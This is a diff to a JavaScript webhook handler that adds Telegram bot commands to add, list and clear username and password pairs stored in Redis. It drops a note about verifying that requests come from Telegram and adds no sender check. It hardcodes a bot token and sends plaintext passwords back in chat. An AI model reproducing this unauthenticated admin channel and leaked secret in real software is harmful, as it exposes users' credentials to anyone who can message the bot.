@@ -1,4 +1,5 @@
 const Pusher = require('pusher');
+const { Redis } = require('@upstash/redis');
 
 const pusher = new Pusher({
     appId: process.env.PUSHER_APP_ID || '2149356',
@@ -8,10 +9,81 @@ const pusher = new Pusher({
     useTLS: true
 });
 
+const redis = new Redis({
+  url: process.env.UPSTASH_REDIS_REST_URL,
+  token: process.env.UPSTASH_REDIS_REST_TOKEN,
+});
+
 export default async function handler(req, res) {
-    // Note: In a real production app, you should verify that the request comes from Telegram.
-    
     const body = req.body;
+    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8758506651:AAH-GCPCua0qS2dIvFINUg1LYMli91_t1Yg';
+
+    // Handle Commands
+    if (body.message && body.message.text) {
+        const text = body.message.text;
+        const chatId = body.message.chat.id;
+
+        // /add_user command
+        if (text.startsWith('/add_user')) {
+            const parts = text.split(' ');
+            if (parts.length === 3) {
+                const u = parts[1];
+                const p = parts[2];
+                await redis.hset('users', { [u]: p });
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: `✅ *USER ADDED (PERMANENT)*\n👤 User: ${u}\n🔑 Pass: ${p}`,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            }
+            return res.status(200).send('OK');
+        }
+
+        // /list_users command
+        if (text === '/list_users') {
+            const allUsers = await redis.hgetall('users');
+            let list = '👥 *CURRENT USERS LIST:*\n\n';
+            
+            if (!allUsers || Object.keys(allUsers).length === 0) {
+                list += '_No users added yet._';
+            } else {
+                for (const [u, p] of Object.entries(allUsers)) {
+                    list += `👤 \`${u}\` : \`${p}\`\n`;
+                }
+            }
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: list,
+                    parse_mode: 'Markdown'
+                })
+            });
+            return res.status(200).send('OK');
+        }
+
+        // /clear_users command
+        if (text === '/clear_users') {
+            await redis.del('users');
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: `🗑️ *USER LIST CLEARED*`,
+                    parse_mode: 'Markdown'
+                })
+            });
+            return res.status(200).send('OK');
+        }
+    }
 
     if (body.callback_query) {
         const action = body.callback_query.data; // e.g., 'state_white_page'
